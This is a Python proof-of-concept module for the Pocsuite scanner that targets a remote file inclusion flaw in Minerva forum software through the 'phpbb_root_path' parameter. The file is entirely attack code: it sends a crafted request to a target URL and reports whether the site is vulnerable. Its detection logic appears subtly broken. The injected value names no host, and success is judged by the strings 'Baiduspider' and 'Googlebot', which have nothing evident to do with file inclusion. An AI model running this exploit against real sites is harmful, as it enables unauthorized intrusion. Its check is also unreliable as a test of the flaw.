#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '64022'  # ssvid
    version = '1.0'
    author = ['皮皮']
    vulDate = '2006-09-28'
    createDate = '2015-12-24'
    updateDate = '2015-12-24'
    references = ['http://www.sebug.net/vuldb/ssvid-64022']
    name = 'Minerva &lt;= 2.0.21 build 238a (phpbb_root_path) File Include Vulnerability'
    appPowerLink = 'http://prdownloads.sourceforge.net/minerva/Minerva-238a.zip?download'
    appName = 'Minerva'
    appVersion = '<= 2.0.21'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/admin/admin_topic_action_logging.php?setmodules=attach&phpbb_root_path=http://?' % self.url
        res = req.get(vul_url)

        if 'Baiduspider' in res.content and 'Googlebot' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(TestPOC)